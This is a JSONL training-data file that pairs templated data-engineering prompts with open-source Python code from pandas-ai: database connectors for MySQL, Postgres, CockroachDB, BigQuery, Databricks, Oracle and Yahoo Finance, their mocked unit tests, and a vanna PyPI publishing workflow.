{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import warnings\nfrom typing import Optional\n\nimport pandas as pd\n\nfrom pandasai.data_loader.semantic_layer_schema import SQLConnectionConfig\n\n\ndef load_from_mysql(\n    connection_info: SQLConnectionConfig, query: str, params: Optional[list] = None\n):\n    import pymysql\n\n    conn = pymysql.connect(\n        host=connection_info.host,\n        user=connection_info.user,\n        password=connection_info.password,\n        database=connection_info.database,\n        port=connection_info.port,\n    )\n    # Suppress warnings of SqlAlchemy\n    # TODO - Later can be removed when SqlAlchemy is to used\n    with warnings.catch_warnings():\n        warnings.simplefilter(\"ignore\", category=UserWarning)\n        return pd.read_sql(query, conn, params=params)\n\n\ndef load_from_postgres(\n    connection_info: SQLConnectionConfig, query: str, params: Optional[list] = None\n):\n    import psycopg2\n\n    conn = psycopg2.connect(\n        host=connection_info.host,\n        user=connection_info.user,\n        password=connection_info.password,\n        dbname=connection_info.database,\n        port=connection_info.port,\n    )\n    # Suppress warnings of SqlAlchemy\n    # TODO - Later can be removed when SqlAlchemy is to used\n    with warnings.catch_warnings():\n        warnings.simplefilter(\"ignore\", category=UserWarning)\n        return pd.read_sql(query, conn, params=params)\n\n\ndef load_from_cockroachdb(\n    connection_info: SQLConnectionConfig, query: str, params: Optional[list] = None\n):\n    import psycopg2\n\n    conn = psycopg2.connect(\n        host=connection_info.host,\n        user=connection_info.user,\n        password=connection_info.password,\n        dbname=connection_info.database,\n        port=connection_info.port,\n    )\n    # Suppress warnings of SqlAlchemy\n    # TODO - Later can be removed when SqlAlchemy is to used\n    with warnings.catch_warnings():\n        warnings.simplefilter(\"ignore\", category=UserWarning)\n        return pd.read_sql(query, conn, params=params)\n\n\n__all__ = [\n    \"load_from_mysql\",\n    \"load_from_postgres\",\n    \"load_from_cockroachdb\",\n]\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/connectors/sql/pandasai_sql/__init__.py", "language": "python", "complexity": "simple", "star_count": 21053, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import unittest\nfrom unittest.mock import MagicMock, patch\n\nimport pandas as pd\n\n# Assuming the functions are in a module called db_loader\nfrom pandasai_sql import (\n    load_from_cockroachdb,\n    load_from_mysql,\n    load_from_postgres,\n)\n\nfrom pandasai.data_loader.semantic_layer_schema import SQLConnectionConfig\n\n\nclass TestDatabaseLoader(unittest.TestCase):\n    @patch(\"pymysql.connect\")\n    @patch(\"pandas.read_sql\")\n    def test_load_from_mysql(self, mock_read_sql, mock_pymysql_connect):\n        # Setup the mock return values\n        mock_conn = MagicMock()\n        mock_pymysql_connect.return_value = mock_conn\n        mock_read_sql.return_value = pd.DataFrame(\n            {\"column1\": [1, 2], \"column2\": [3, 4]}\n        )\n\n        # Test data\n        connection_info = {\n            \"host\": \"localhost\",\n            \"user\": \"root\",\n            \"password\": \"password\",\n            \"database\": \"test_db\",\n            \"port\": 3306,\n        }\n\n        query = \"SELECT * FROM test_table\"\n\n        connection_config = SQLConnectionConfig(**connection_info)\n\n        result = load_from_mysql(connection_config, query)\n\n        # Assert that the connection is made and SQL query is executed\n        mock_pymysql_connect.assert_called_once_with(\n            host=\"localhost\",\n            user=\"root\",\n            password=\"password\",\n            database=\"test_db\",\n            port=3306,\n        )\n        mock_read_sql.assert_called_once_with(query, mock_conn, params=None)\n\n        # Assert the result is a DataFrame\n        self.assertIsInstance(result, pd.DataFrame)\n        self.assertEqual(result.shape, (2, 2))\n\n    @patch(\"psycopg2.connect\")\n    @patch(\"pandas.read_sql\")\n    def test_load_from_postgres(self, mock_read_sql, mock_psycopg2_connect):\n        # Setup the mock return values\n        mock_conn = MagicMock()\n        mock_psycopg2_connect.return_value = mock_conn\n        mock_read_sql.return_value = pd.DataFrame(\n            {\"column1\": [5, 6], \"column2\": [7, 8]}\n        )\n\n        # Test data\n        connection_info = {\n            \"host\": \"localhost\",\n            \"user\": \"postgres\",\n            \"password\": \"password\",\n            \"database\": \"test_db\",\n            \"port\": 5432,\n        }\n        query = \"SELECT * FROM test_table\"\n\n        connection_config = SQLConnectionConfig(**connection_info)\n\n        result = load_from_postgres(connection_config, query)\n\n        # Assert that the connection is made and SQL query is executed\n        mock_psycopg2_connect.assert_called_once_with(\n            host=\"localhost\",\n            user=\"postgres\",\n            password=\"password\",\n            dbname=\"test_db\",\n            port=5432,\n        )\n        mock_read_sql.assert_called_once_with(query, mock_conn, params=None)\n\n        # Assert the result is a DataFrame\n        self.assertIsInstance(result, pd.DataFrame)\n        self.assertEqual(result.shape, (2, 2))\n\n    @patch(\"psycopg2.connect\")\n    @patch(\"pandas.read_sql\")\n    def test_load_from_cockroachdb(self, mock_read_sql, mock_postgresql_connect):\n        # Setup the mock return values\n        mock_conn = MagicMock()\n        mock_postgresql_connect.return_value = mock_conn\n        mock_read_sql.return_value = pd.DataFrame(\n            {\"column1\": [13, 14], \"column2\": [15, 16]}\n        )\n\n        # Test data\n        connection_info = {\n            \"host\": \"localhost\",\n            \"user\": \"root\",\n            \"password\": \"password\",\n            \"database\": \"test_db\",\n            \"port\": 26257,\n        }\n        query = \"SELECT * FROM test_table\"\n\n        connection_config = SQLConnectionConfig(**connection_info)\n\n        result = load_from_cockroachdb(connection_config, query)\n\n        # Assert that the connection is made and SQL query is executed\n        mock_postgresql_connect.assert_called_once_with(\n            host=\"localhost\",\n            user=\"root\",\n            password=\"password\",\n            dbname=\"test_db\",\n            port=26257,\n        )\n        mock_read_sql.assert_called_once_with(query, mock_conn, params=None)\n\n        # Assert the result is a DataFrame\n        self.assertIsInstance(result, pd.DataFrame)\n        self.assertEqual(result.shape, (2, 2))\n\n    @patch(\"pymysql.connect\")\n    @patch(\"pandas.read_sql\")\n    def test_load_from_mysql_with_params(self, mock_read_sql, mock_pymysql_connect):\n        mock_conn = MagicMock()\n        mock_pymysql_connect.return_value = mock_conn\n        mock_read_sql.return_value = pd.DataFrame(\n            {\"column1\": [1, 2], \"column2\": [3, 4]}\n        )\n\n        connection_info = {\n            \"host\": \"localhost\",\n            \"user\": \"root\",\n            \"password\": \"password\",\n            \"database\": \"test_db\",\n            \"port\": 3306,\n        }\n        query = \"SELECT * FROM test_table WHERE id = %s\"\n        query_params = [123]\n\n        connection_config = SQLConnectionConfig(**connection_info)\n\n        result = load_from_mysql(connection_config, query, query_params)\n\n        mock_pymysql_connect.assert_called_once_with(\n            host=\"localhost\",\n            user=\"root\",\n            password=\"password\",\n            database=\"test_db\",\n            port=3306,\n        )\n        mock_read_sql.assert_called_once_with(query, mock_conn, params=query_params)\n\n        self.assertIsInstance(result, pd.DataFrame)\n        self.assertEqual(result.shape, (2, 2))\n\n    @patch(\"psycopg2.connect\")\n    @patch(\"pandas.read_sql\")\n    def test_load_from_postgres_with_params(self, mock_read_sql, mock_psycopg2_connect):\n        mock_conn = MagicMock()\n        mock_psycopg2_connect.return_value = mock_conn\n        mock_read_sql.return_value = pd.DataFrame(\n            {\"column1\": [5, 6], \"column2\": [7, 8]}\n        )\n\n        connection_info = {\n            \"host\": \"localhost\",\n            \"user\": \"postgres\",\n            \"password\": \"password\",\n            \"database\": \"test_db\",\n            \"port\": 5432,\n        }\n        query = \"SELECT * FROM test_table WHERE name ILIKE %s\"\n        query_params = [\"%John%\"]\n\n        connection_config = SQLConnectionConfig(**connection_info)\n\n        result = load_from_postgres(connection_config, query, query_params)\n\n        mock_psycopg2_connect.assert_called_once_with(\n            host=\"localhost\",\n            user=\"postgres\",\n            password=\"password\",\n            dbname=\"test_db\",\n            port=5432,\n        )\n        mock_read_sql.assert_called_once_with(query, mock_conn, params=query_params)\n\n        self.assertIsInstance(result, pd.DataFrame)\n        self.assertEqual(result.shape, (2, 2))\n\n    @patch(\"psycopg2.connect\")\n    @patch(\"pandas.read_sql\")\n    def test_load_from_cockroachdb_with_params(\n        self, mock_read_sql, mock_postgresql_connect\n    ):\n        mock_conn = MagicMock()\n        mock_postgresql_connect.return_value = mock_conn\n        mock_read_sql.return_value = pd.DataFrame(\n            {\"column1\": [13, 14], \"column2\": [15, 16]}\n        )\n\n        connection_info = {\n            \"host\": \"localhost\",\n            \"user\": \"root\",\n            \"password\": \"password\",\n            \"database\": \"test_db\",\n            \"port\": 26257,\n        }\n        query = \"SELECT * FROM test_table WHERE status = %s\"\n        query_params = [\"active\"]\n\n        connection_config = SQLConnectionConfig(**connection_info)\n\n        result = load_from_cockroachdb(connection_config, query, query_params)\n\n        mock_postgresql_connect.assert_called_once_with(\n            host=\"localhost\",\n            user=\"root\",\n            password=\"password\",\n            dbname=\"test_db\",\n            port=26257,\n        )\n        mock_read_sql.assert_called_once_with(query, mock_conn, params=query_params)\n\n        self.assertIsInstance(result, pd.DataFrame)\n        self.assertEqual(result.shape, (2, 2))\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/connectors/sql/tests/test_sql.py", "language": "python", "complexity": "complex", "star_count": 21053, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "def load_from_yahoo_finance(connection_info, query):\n    import yfinance as yf\n\n    ticker = yf.Ticker(connection_info[\"ticker\"])\n    data = ticker.history(period=connection_info.get(\"period\", \"1mo\"))\n\n    return data.to_csv(index=True)\n\n\n__all__ = [\"load_from_yahoo_finance\"]\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/connectors/yfinance/pandasai_yfinance/__init__.py", "language": "python", "complexity": "simple", "star_count": 21053, "quality_score": 0.8600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import unittest\nfrom unittest.mock import MagicMock, patch\n\nimport pandas as pd\n\n# Assuming the functions are in a module called yahoo_finance\nfrom pandasai_yfinance import load_from_yahoo_finance\n\n\nclass TestYahooFinanceLoader(unittest.TestCase):\n    @patch(\"yfinance.Ticker\")\n    def test_load_from_yahoo_finance(self, MockTicker):\n        # Setup the mock return value for history method\n        mock_ticker_instance = MagicMock()\n        MockTicker.return_value = mock_ticker_instance\n        mock_ticker_instance.history.return_value = pd.DataFrame(\n            {\n                \"Date\": [\"2025-01-01\", \"2025-01-02\"],\n                \"Open\": [150, 152],\n                \"High\": [155, 157],\n                \"Low\": [148, 150],\n                \"Close\": [153, 155],\n                \"Volume\": [100000, 120000],\n            },\n            index=pd.to_datetime([\"2025-01-01\", \"2025-01-02\"]),\n        )\n\n        # Test data\n        connection_info = {\"ticker\": \"AAPL\", \"period\": \"1d\"}\n        query = (\n            \"\"\n        )  # Since the query parameter is not used, we can leave it as an empty string\n\n        # Call the function under test\n        result = load_from_yahoo_finance(connection_info, query)\n\n        # Assert that the Ticker method was called with the correct ticker symbol\n        MockTicker.assert_called_once_with(\"AAPL\")\n\n        # Assert that the history method was called with the correct period\n        mock_ticker_instance.history.assert_called_once_with(period=\"1d\")\n\n        print(result)\n\n        # Assert the result is a CSV string\n        self.assertTrue(result.startswith(\",Date,Open,High,Low,Close,Volume\"))\n        self.assertIn(\"2025-01-01\", result)\n        self.assertIn(\"2025-01-02\", result)\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/connectors/yfinance/tests/test_yahoo_finance.py", "language": "python", "complexity": "simple", "star_count": 21053, "quality_score": 0.98, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import pandas as pd\nfrom google.cloud import bigquery\n\n\ndef load_from_bigquery(connection_info, query):\n    client = bigquery.Client(\n        project=connection_info[\"project_id\"],\n        credentials=connection_info.get(\"credentials\"),\n    )\n\n    query_job = client.query(query)\n    return pd.DataFrame(query_job.result())\n\n\n__all__ = [\"load_from_bigquery\"]\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/ee/connectors/bigquery/pandasai_bigquery/__init__.py", "language": "python", "complexity": "simple", "star_count": 21053, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from unittest.mock import MagicMock, patch\n\nimport pandas as pd\nimport pytest\nfrom pandasai_bigquery import load_from_bigquery\n\n\n@pytest.fixture\ndef mock_connection_info():\n    return {\n        \"project_id\": \"test-project\",\n        \"credentials\": None,\n    }\n\n\n@pytest.fixture\ndef mock_query_result():\n    # Mock query result with sample data\n    return [\n        {\"column1\": \"value1\", \"column2\": 123},\n        {\"column1\": \"value2\", \"column2\": 456},\n    ]\n\n\ndef test_load_from_bigquery_success(mock_connection_info, mock_query_result):\n    query = \"SELECT * FROM test_table\"\n\n    # Mock the BigQuery client and query job\n    with patch(\"google.cloud.bigquery.Client\") as MockBigQueryClient:\n        mock_client = MagicMock()\n        MockBigQueryClient.return_value = mock_client\n\n        mock_query_job = MagicMock()\n        mock_client.query.return_value = mock_query_job\n\n        mock_query_job.result.return_value = [\n            MagicMock(**row) for row in mock_query_result\n        ]\n\n        # Mock converting query results to DataFrame\n        mock_dataframe = pd.DataFrame(mock_query_result)\n        with patch(\"pandas.DataFrame\", return_value=mock_dataframe):\n            result = load_from_bigquery(mock_connection_info, query)\n\n            # Assertions\n            mock_client.query.assert_called_once_with(query)\n            assert isinstance(result, type(mock_dataframe))\n            assert result.equals(mock_dataframe)\n\n\ndef test_load_from_bigquery_failure(mock_connection_info):\n    query = \"SELECT * FROM non_existent_table\"\n\n    # Mock the BigQuery client and query job\n    with patch(\"google.cloud.bigquery.Client\") as MockBigQueryClient:\n        mock_client = MagicMock()\n        MockBigQueryClient.return_value = mock_client\n\n        mock_query_job = MagicMock()\n        mock_client.query.return_value = mock_query_job\n\n        # Simulate an exception during query execution\n        mock_query_job.result.side_effect = Exception(\"Query failed\")\n\n        with pytest.raises(Exception, match=\"Query failed\"):\n            load_from_bigquery(mock_connection_info, query)\n\n        # Assertions\n        mock_client.query.assert_called_once_with(query)\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/ee/connectors/bigquery/tests/test_bigquery.py", "language": "python", "complexity": "simple", "star_count": 21053, "quality_score": 0.9500000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import pandas as pd\nfrom databricks import sql\n\n\ndef load_from_databricks(config):\n    \"\"\"\n    Load data from Databricks SQL into a pandas DataFrame.\n\n    Args:\n        config (dict): Configuration dictionary containing:\n            - host: Databricks server hostname\n            - http_path: HTTP path for the SQL warehouse\n            - token: Access token for authentication\n            - database: (optional) Database name\n            - table: (optional) Table name\n            - query: (optional) Custom SQL query\n\n    Returns:\n        pd.DataFrame: DataFrame containing the query results\n    \"\"\"\n    connection = sql.connect(\n        server_hostname=config[\"host\"],\n        http_path=config[\"http_path\"],\n        access_token=config[\"token\"],\n    )\n\n    cursor = connection.cursor()\n\n    try:\n        if \"query\" in config:\n            query = config[\"query\"]\n        elif \"table\" in config:\n            query = f\"SELECT * FROM {config['database']}.{config['table']}\"\n        else:\n            raise ValueError(\"Either 'query' or 'table' must be provided in config\")\n\n        cursor.execute(query)\n        result = cursor.fetchall()\n\n        if not result:\n            return pd.DataFrame()\n\n        columns = [desc[0] for desc in cursor.description]\n        return pd.DataFrame(result, columns=columns)\n    finally:\n        cursor.close()\n        connection.close()\n\n\n__all__ = [\"load_from_databricks\"]\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/ee/connectors/databricks/pandasai_databricks/__init__.py", "language": "python", "complexity": "simple", "star_count": 21053, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import unittest\nfrom unittest.mock import MagicMock, patch\n\nfrom pandasai_databricks import (\n    load_from_databricks,\n)\n\n\nclass TestDatabricksLoader(unittest.TestCase):\n    @patch(\"databricks.sql.connect\")\n    def test_load_from_databricks_with_query(self, MockConnect):\n        # Mock the connection and cursor\n        mock_connection = MagicMock()\n        MockConnect.return_value = mock_connection\n        mock_cursor = MagicMock()\n        mock_connection.cursor.return_value = mock_cursor\n\n        # Sample data that would be returned by Databricks SQL\n        mock_cursor.fetchall.return_value = [\n            (1, \"Alice\", 100),\n            (2, \"Bob\", 200),\n        ]\n        mock_cursor.description = [(\"id\",), (\"name\",), (\"value\",)]\n\n        # Test config with a custom SQL query\n        config = {\n            \"host\": \"databricks_host\",\n            \"http_path\": \"http_path\",\n            \"token\": \"access_token\",\n            \"query\": \"SELECT * FROM sample_table\",\n        }\n\n        # Call the function under test\n        result = load_from_databricks(config)\n\n        # Assertions\n        MockConnect.assert_called_once_with(\n            server_hostname=\"databricks_host\",\n            http_path=\"http_path\",\n            access_token=\"access_token\",\n        )\n        mock_cursor.execute.assert_called_once_with(\"SELECT * FROM sample_table\")\n        self.assertEqual(result.shape[0], 2)  # 2 rows\n        self.assertEqual(result.shape[1], 3)  # 3 columns\n        self.assertTrue(\"id\" in result.columns)\n        self.assertTrue(\"name\" in result.columns)\n        self.assertTrue(\"value\" in result.columns)\n\n    @patch(\"databricks.sql.connect\")\n    def test_load_from_databricks_with_table(self, MockConnect):\n        # Mock the connection and cursor\n        mock_connection = MagicMock()\n        MockConnect.return_value = mock_connection\n        mock_cursor = MagicMock()\n        mock_connection.cursor.return_value = mock_cursor\n\n        # Sample data returned by Databricks SQL\n        mock_cursor.fetchall.return_value = [\n            (1, \"Alice\", 100),\n            (2, \"Bob\", 200),\n        ]\n        mock_cursor.description = [(\"id\",), (\"name\",), (\"value\",)]\n\n        # Test config with a table name\n        config = {\n            \"host\": \"databricks_host\",\n            \"http_path\": \"http_path\",\n            \"token\": \"access_token\",\n            \"database\": \"test_db\",\n            \"table\": \"sample_table\",\n        }\n\n        # Call the function under test\n        result = load_from_databricks(config)\n\n        # Assertions\n        query = \"SELECT * FROM test_db.sample_table\"\n        mock_cursor.execute.assert_called_once_with(query)\n        self.assertEqual(result.shape[0], 2)\n        self.assertEqual(result.shape[1], 3)\n        self.assertTrue(\"id\" in result.columns)\n        self.assertTrue(\"name\" in result.columns)\n        self.assertTrue(\"value\" in result.columns)\n\n    @patch(\"databricks.sql.connect\")\n    def test_load_from_databricks_no_query_or_table(self, MockConnect):\n        # Mock the connection and cursor\n        mock_connection = MagicMock()\n        MockConnect.return_value = mock_connection\n        mock_cursor = MagicMock()\n        mock_connection.cursor.return_value = mock_cursor\n\n        # Test config with neither query nor table\n        config = {\n            \"host\": \"databricks_host\",\n            \"http_path\": \"http_path\",\n            \"token\": \"access_token\",\n        }\n\n        # Call the function under test and assert that it raises a ValueError\n        with self.assertRaises(ValueError):\n            load_from_databricks(config)\n\n    @patch(\"databricks.sql.connect\")\n    def test_load_from_databricks_empty_result(self, MockConnect):\n        # Mock the connection and cursor\n        mock_connection = MagicMock()\n        MockConnect.return_value = mock_connection\n        mock_cursor = MagicMock()\n        mock_connection.cursor.return_value = mock_cursor\n\n        # Empty result set\n        mock_cursor.fetchall.return_value = []\n        mock_cursor.description = [(\"id\",), (\"name\",), (\"value\",)]\n\n        # Test config with a custom SQL query\n        config = {\n            \"host\": \"databricks_host\",\n            \"http_path\": \"http_path\",\n            \"token\": \"access_token\",\n            \"query\": \"SELECT * FROM sample_table\",\n        }\n\n        # Call the function under test\n        result = load_from_databricks(config)\n\n        # Assertions\n        self.assertTrue(result.empty)  # Result should be an empty DataFrame\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/ee/connectors/databricks/tests/test_databricks.py", "language": "python", "complexity": "medium", "star_count": 21053, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import cx_Oracle\nimport pandas as pd\n\n\ndef load_from_oracle(connection_info, query):\n    dsn = cx_Oracle.makedsn(\n        connection_info[\"host\"],\n        connection_info[\"port\"],\n        service_name=connection_info.get(\"service_name\"),\n        sid=connection_info.get(\"sid\"),\n    )\n    conn = cx_Oracle.connect(\n        user=connection_info[\"user\"], password=connection_info[\"password\"], dsn=dsn\n    )\n    return pd.read_sql(query, conn)\n\n\n__all__ = [\"load_from_oracle\"]\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/ee/connectors/oracle/pandasai_oracle/__init__.py", "language": "python", "complexity": "simple", "star_count": 21053, "quality_score": 0.8600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import unittest\nfrom unittest.mock import MagicMock, patch\n\nimport pandas as pd\nfrom pandasai_oracle import load_from_oracle\n\n\nclass TestOracleLoader(unittest.TestCase):\n    @patch(\"cx_Oracle.connect\")\n    @patch(\"pandas.read_sql\")\n    @patch(\"cx_Oracle.makedsn\")\n    def test_load_from_oracle_success(self, mock_makedsn, mock_read_sql, mock_connect):\n        # Mock the connection and cursor\n        mock_connection = MagicMock()\n        mock_connect.return_value = mock_connection\n        mock_makedsn.return_value = \"oracle_host:1521/orcl_service\"\n\n        # Sample data returned by the Oracle query\n        mock_data = [(1, \"Alice\", 100), (2, \"Bob\", 200)]\n        mock_read_sql.return_value = pd.DataFrame(\n            mock_data, columns=[\"id\", \"name\", \"value\"]\n        )\n\n        # Test config for Oracle connection\n        config = {\n            \"host\": \"oracle_host\",\n            \"port\": 1521,\n            \"service_name\": \"orcl_service\",\n            \"user\": \"username\",\n            \"password\": \"password\",\n        }\n        query = \"SELECT * FROM users\"\n\n        # Call the function under test\n        result = load_from_oracle(config, query)\n\n        # Assertions\n        mock_connect.assert_called_once_with(\n            user=\"username\",\n            password=\"password\",\n            dsn=\"oracle_host:1521/orcl_service\",\n        )\n        mock_read_sql.assert_called_once_with(query, mock_connection)\n        self.assertEqual(result.shape[0], 2)  # 2 rows\n        self.assertEqual(result.shape[1], 3)  # 3 columns\n        self.assertTrue(\"id\" in result.columns)\n        self.assertTrue(\"name\" in result.columns)\n        self.assertTrue(\"value\" in result.columns)\n\n    @patch(\"cx_Oracle.connect\")\n    @patch(\"pandas.read_sql\")\n    @patch(\"cx_Oracle.makedsn\")\n    def test_load_from_oracle_with_sid(self, mock_makedsn, mock_read_sql, mock_connect):\n        # Mock the connection and cursor\n        mock_connection = MagicMock()\n        mock_connect.return_value = mock_connection\n        mock_makedsn.return_value = \"oracle_host:1521/orcl_sid\"\n\n        # Sample data returned by the Oracle query\n        mock_data = [(1, \"Alice\", 100), (2, \"Bob\", 200)]\n        mock_read_sql.return_value = pd.DataFrame(\n            mock_data, columns=[\"id\", \"name\", \"value\"]\n        )\n\n        # Test config with SID instead of service_name\n        config = {\n            \"host\": \"oracle_host\",\n            \"port\": 1521,\n            \"sid\": \"orcl_sid\",\n            \"user\": \"username\",\n            \"password\": \"password\",\n        }\n        query = \"SELECT * FROM users\"\n\n        # Call the function under test\n        result = load_from_oracle(config, query)\n\n        # Assertions\n        mock_connect.assert_called_once_with(\n            user=\"username\",\n            password=\"password\",\n            dsn=\"oracle_host:1521/orcl_sid\",\n        )\n        mock_read_sql.assert_called_once_with(query, mock_connection)\n        self.assertEqual(result.shape[0], 2)\n        self.assertEqual(result.shape[1], 3)\n        self.assertTrue(\"id\" in result.columns)\n        self.assertTrue(\"name\" in result.columns)\n        self.assertTrue(\"value\" in result.columns)\n\n    @patch(\"cx_Oracle.connect\")\n    @patch(\"pandas.read_sql\")\n    def test_load_from_oracle_empty_result(self, mock_read_sql, mock_connect):\n        # Mock the connection and cursor\n        mock_connection = MagicMock()\n        mock_connect.return_value = mock_connection\n\n        # Return an empty result set\n        mock_read_sql.return_value = pd.DataFrame(columns=[\"id\", \"name\", \"value\"])\n\n        # Test config for Oracle connection\n        config = {\n            \"host\": \"oracle_host\",\n            \"port\": 1521,\n            \"service_name\": \"orcl_service\",\n            \"user\": \"username\",\n            \"password\": \"password\",\n        }\n        query = \"SELECT * FROM empty_table\"\n\n        # Call the function under test\n        result = load_from_oracle(config, query)\n\n        # Assertions\n        self.assertTrue(result.empty)  # Result should be an empty DataFrame\n\n    @patch(\"cx_Oracle.connect\")\n    def test_load_from_oracle_missing_params(self, mock_connect):\n        # Test config with missing parameters (host, user, etc.)\n        config = {\n            \"port\": 1521,\n            \"service_name\": \"orcl_service\",\n            \"password\": \"password\",\n        }\n        query = \"SELECT * FROM users\"\n\n        # Call the function under test and assert that it raises a KeyError\n        with self.assertRaises(KeyError):\n            load_from_oracle(config, query)\n\n    @patch(\"cx_Oracle.connect\")\n    @patch(\"pandas.read_sql\")\n    def test_load_from_oracle_invalid_query(self, mock_read_sql, mock_connect):\n        # Mock the connection and cursor\n        mock_connection = MagicMock()\n        mock_connect.return_value = mock_connection\n\n        # Simulate an invalid SQL query\n        mock_read_sql.side_effect = Exception(\"SQL error\")\n\n        # Test config for Oracle connection\n        config = {\n            \"host\": \"oracle_host\",\n            \"port\": 1521,\n            \"service_name\": \"orcl_service\",\n            \"user\": \"username\",\n            \"password\": \"password\",\n        }\n        query = \"INVALID SQL QUERY\"\n\n        # Call the function under test and assert that it raises an Exception\n        with self.assertRaises(Exception):\n            load_from_oracle(config, query)\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n", "metadata": {"source": "github.com/sinaptik-ai/pandas-ai", "file_path": "extensions/ee/connectors/oracle/tests/test_oracle.py", "language": "python", "complexity": "medium", "star_count": 21053, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# This workflow will upload a Python Package using Twine when a release is created\n# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python#publishing-to-package-registries\n\n# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\nname: Upload Python Package\n\non:\n  release:\n    types: [published]\n\npermissions:\n  contents: read\n\njobs:\n  deploy:\n\n    runs-on: ubuntu-latest\n\n    steps:\n    - uses: actions/checkout@v3\n    - name: Set up Python\n      uses: actions/setup-python@v3\n      with:\n        python-version: '3.x'\n    - name: Install dependencies\n      run: |\n        python -m pip install --upgrade pip\n        pip install build\n    - name: Build package\n      run: python -m build\n    - name: Publish package\n      uses: pypa/gh-action-pypi-publish@27b31702a0e7fc50959f5ad993c78deac1bdfc29\n      with:\n        user: __token__\n        password: ${{ secrets.PYPI_API_TOKEN }}", "metadata": {"source": "github.com/vanna-ai/vanna", "file_path": ".github/workflows/python-publish.yaml", "language": "yaml", "complexity": "simple", "star_count": 19604, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
